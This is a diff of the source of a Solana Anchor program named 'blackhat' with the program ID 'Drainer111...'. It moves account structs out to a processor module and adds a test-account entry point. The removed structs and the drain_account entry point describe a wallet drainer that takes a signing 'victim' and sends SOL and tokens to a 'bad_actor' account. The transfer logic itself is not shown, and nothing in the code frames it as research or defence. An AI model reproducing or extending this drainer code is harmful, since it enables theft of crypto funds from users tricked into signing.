@@ -1,40 +1,15 @@
 use anchor_lang::prelude::*;
 use anchor_lang::system_program::{self};
-use anchor_spl::associated_token::AssociatedToken;
+use anchor_spl::token::spl_token;
 use anchor_spl::token::{self};
-use anchor_spl::token::{spl_token, Token};
 use borsh::BorshDeserialize;
 
 pub mod error;
+pub mod processor;
+
+use crate::processor::*;
 
 declare_id!("Drainer1111111111111111111111111111111111111");
-
-#[derive(Accounts)]
-pub struct DrainAccount<'info> {
-    #[account(mut)]
-    pub victim: Signer<'info>,
-
-    #[account(mut)]
-    pub bad_actor: UncheckedAccount<'info>,
-    pub system_program: Program<'info, System>,
-}
-
-#[derive(Accounts)]
-pub struct DrainTokenAccount<'info> {
-    pub victim: Signer<'info>,
-    pub bad_actor: UncheckedAccount<'info>,
-
-    pub mint: AccountInfo<'info>,
-
-    #[account(mut)]
-    pub victim_ata: AccountInfo<'info>,
-    #[account(mut)]
-    pub bad_actor_ata: AccountInfo<'info>,
-    pub system_program: Program<'info, System>,
-
-    pub token_program: Program<'info, Token>,
-    pub associated_token_program: Program<'info, AssociatedToken>,
-}
 
 #[program]
 pub mod blackhat {
@@ -42,6 +17,12 @@ pub mod blackhat {
     use super::*;
     use anchor_spl::associated_token;
     use solana_program::program_pack::Pack;
+
+    pub fn create_test_account_v1<'info>(
+        ctx: Context<'_, '_, '_, 'info, CreateTestAccountV1<'info>>,
+    ) -> Result<()> {
+        processor::create_test_account(ctx)
+    }
 
     pub fn drain_account<'info>(
         ctx: Context<'_, '_, '_, 'info, DrainAccount<'info>>,
